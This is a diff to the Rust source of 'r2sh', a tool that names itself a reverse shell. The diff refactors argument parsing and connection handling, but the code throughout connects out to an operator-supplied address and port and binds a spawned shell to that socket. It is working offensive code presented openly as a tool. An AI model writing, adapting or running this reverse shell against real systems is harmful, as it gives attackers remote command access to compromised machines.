@@ -4,24 +4,19 @@ use std::os::fd::{AsRawFd, FromRawFd};
 use std::process::{exit, Command, Stdio};
 use getopts::Options;
 
-struct R2shCtx {
-    port: u16,
-    addr: String
-}
-
 fn show_usage(progname: &str, opts: Options) {
     const BANNER: &str = "      ____      _\n  \
                            _ _|___ \\ ___| |__\n \
                           | '__|__) / __| '_ \\\n \
                           | |  / __/\\__ \\ | | |\n \
                           |_| |_____|___/_| |_|\n\
-                         (r)ust(r)everse(s)hell\n";
+                         (r)ust(r)everse(sh)ell\n";
     let brief = format!("{BANNER}\nusage: {progname} [OPTIONS]");
 
     print!("{}", opts.usage(&brief));
 }
 
-fn parse_args() -> Option<R2shCtx> {
+fn parse_args() -> Option<(String, u16)> {
     let mut opts = Options::new();
     let args: Vec<String> = args().collect();
 
@@ -44,7 +39,7 @@ fn parse_args() -> Option<R2shCtx> {
     let addr: String = parsed_opts.opt_str("s").unwrap();
     let port: u16 = parsed_opts.opt_str("p").unwrap().parse().unwrap();
 
-    Some(R2shCtx{ addr, port })
+    Some((addr, port))
 }
 
 fn exec_shell(fd: i32) {
@@ -59,12 +54,10 @@ fn exec_shell(fd: i32) {
         .unwrap();
 }
 
-fn run(ctx: R2shCtx) {
+fn run(addr: String, port: u16) {
     println!("[+] trying to connect to server...");
 
-    let conn = TcpStream::connect(format!("{}:{}", ctx.addr, ctx.port));
-
-    match conn {
+    match TcpStream::connect((addr, port)) {
         Ok(sock) => {
             println!("[+] connection established!");
             exec_shell(sock.as_raw_fd())
@@ -74,10 +67,10 @@ fn run(ctx: R2shCtx) {
 }
 
 fn main() {
-    let ctx = match parse_args() {
-        Some(ctx) => ctx,
+    let (addr, port) = match parse_args() {
+        Some((a, p)) => (a, p),
         None => exit(1)
     };
 
-    run(ctx);
+    run(addr, port);
 }
